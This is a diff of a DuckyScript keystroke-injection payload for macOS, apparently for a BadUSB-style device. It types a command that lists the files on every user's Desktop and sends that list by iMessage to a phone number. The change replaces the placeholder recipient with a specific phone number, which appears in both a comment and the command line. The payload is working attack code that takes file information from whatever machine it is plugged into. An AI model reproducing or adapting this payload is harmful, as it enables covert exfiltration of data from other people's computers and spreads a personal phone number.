@@ -2,7 +2,7 @@ REM This script gets a list of the files on the Desktop,
 REM then it sends the list to your iphone.
 REM Shoutout to matthewkayne and 0iphor13 for the Phone code part.
 
-REM Replace "Phone Number HERE" with your phone number to receive MacOs System information
+REM Replace "0431090156" with your phone number to receive MacOs System information
 
 REM Title: Desktop file list to iPhone
 REM Author: NARSTY
@@ -28,7 +28,7 @@ DELAY 500
 ENTER
 ENTER 
 DELAY 500
-STRING  x=$(ls /Users/*/Desktop); osascript -e 'tell application "Messages" to send "'$x'" to buddy "Phone Number HERE"'
+STRING  x=$(ls /Users/*/Desktop); osascript -e 'tell application "Messages" to send "'$x'" to buddy "0431090156"'
 DELAY 500
 ENTER
 DELAY 500
